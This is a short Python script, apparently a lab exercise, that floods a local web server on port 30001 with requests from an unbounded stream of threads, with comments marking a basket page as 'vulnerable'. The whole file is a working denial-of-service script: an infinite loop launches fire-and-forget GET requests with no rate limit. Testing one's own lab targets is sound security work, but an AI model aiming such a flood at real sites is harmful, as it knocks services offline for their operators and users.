import requests
import threading

url = 'http://localhost:30001/basket.html' #vulnerable
home = 'http://localhost:30001/' #not work

def request_task(t):
    requests.get(t)


def fire_and_forget(url):
    threading.Thread(target=request_task, kwargs={"t":url}).start()

i = 0

if __name__ == "__main__":
    while True:
        fire_and_forget(home)
